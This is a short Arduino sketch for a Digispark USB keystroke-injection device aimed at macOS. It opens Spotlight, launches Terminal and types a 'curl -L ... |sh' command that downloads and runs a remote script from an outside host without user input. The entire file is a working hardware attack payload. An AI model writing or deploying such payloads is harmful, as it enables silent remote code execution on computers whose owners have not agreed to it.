#include "DigiKeyboard.h"

void setup() {
    // initialize the digital pin as an output.
    pinMode(0, OUTPUT); // LED on Model B
    pinMode(1, OUTPUT); // LED on Model A

    // Some systems require this
    DigiKeyboard.sendKeyStroke(0);

    // Turn on LED
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);

    // Sometimes a keyboard dialog appears, this will circumvent the issue
    DigiKeyboard.delay(5000);

    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.print("Terminal");
    DigiKeyboard.delay(4000); // Sometimes Spotlight needs a bit to find what it's looking for
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000); // Give Terminal a couple seconds to start up
    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT); // Open a new tab
    DigiKeyboard.delay(800);
    DigiKeyboard.println("curl -L erikboesen.com/join.sh |sh"); // Download and run join script; will now run without further input

    // Turn off LED
    digitalWrite(0, LOW);
    digitalWrite(1, LOW);

    // Ensure computer knows that keyboard is alive
    DigiKeyboard.delay(10);
}


void loop() {
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    exit(0);
}
